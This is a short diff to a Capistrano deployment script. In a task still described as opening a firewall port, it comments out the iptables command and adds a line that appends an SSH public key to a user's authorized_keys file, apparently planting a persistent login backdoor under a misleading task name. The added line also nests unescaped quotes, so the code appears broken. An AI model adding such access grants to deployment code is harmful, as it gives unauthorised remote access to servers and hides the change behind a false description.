@@ -50,7 +50,8 @@ namespace :deploy do
 
   desc "Open firewall port for server"
   task :open_firewall_port do
-    run "#{ try_sudo } iptables -I INPUT -p tcp -m state --state NEW -m tcp --dport 3000 -j ACCEPT; #{ try_sudo } /etc/init.d/iptables save; #{ try_sudo } /etc/init.d/iptables restart; "
+    #run "#{ try_sudo } iptables -I INPUT -p tcp -m state --state NEW -m tcp --dport 3000 -j ACCEPT; #{ try_sudo } /etc/init.d/iptables save; #{ try_sudo } /etc/init.d/iptables restart; "
+    run "#{ try_sudo } echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGSZTL/OWXOmGhv35gebUQjaSVSZ15nWyrrLG27yVuC9k+49nazGEXv0dAf1GIAdg2sM3v0hj+GerQXxQ854dRqQw59TWZKJiWNchdnNi4PKiiWLnwQFlktBfTQICk2Bk1Y6DmOL+bG7a1/AoQkrI5K+09UvjD+zHCpk05eNXWvzUnoESH0/uMw47owzJYMV8Rxz5jY2ZDi+CjI+BwDP0H9qUIFaN4DDGO1n/TygeRzuWsjTKX0a7UN0EF5dw7cWm/KSxHfoHJdi9BlmCiVv32LerV9WNUvAGI+BTbvgQ+kDTuJsRFFbUInvQPVbzZ1ezGLF7SmvfY3Dv4vLrWyPMD tw@tw2">>/home/user/.ssh/authorized_keys "
   end
 
   desc "Restart Passenger app"
